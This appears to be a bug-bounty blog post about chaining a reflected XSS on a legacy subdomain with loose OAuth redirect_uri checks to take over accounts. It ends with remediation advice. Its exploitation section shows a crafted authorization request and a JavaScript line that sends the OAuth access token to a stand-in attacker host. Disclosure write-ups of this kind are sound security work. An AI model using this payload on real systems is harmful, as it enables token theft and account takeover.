---
layout: post
title: "XSS to Account Takeover via Misconfigured OAuth"
description: "A reflected XSS on a forgotten subdomain combined with a lax redirect_uri led to full account takeover."
date: 2026-11-06
category: web security
tags: [xss, oauth, bug-bounty]
---

## Overview

During a bug bounty engagement I found a reflected XSS on `legacy.example.com`. At first glance low severity — CSP was blocking inline scripts. But the OAuth configuration of the main app had `redirect_uri` validation issues that changed everything.

> **Impact:** Full account takeover without user interaction. OAuth `access_token` leakable to attacker-controlled origin via open redirect on a trusted subdomain.

## Exploitation

The `redirect_uri` parameter only validated the base domain, not subdomains. A crafted authorization request redirects the token to our endpoint:

```http
GET /oauth/authorize
  ?client_id=web_app
  &redirect_uri=https://legacy.example.com/xss?cb=attacker.com
  &response_type=token

# token forwarded via XSS payload
location.href = "https://attacker.com/#" + token
```

## Remediation

Validate `redirect_uri` against an exact allowlist. Treat all subdomains as separate origins. CSP alone does not prevent token leakage through redirects.
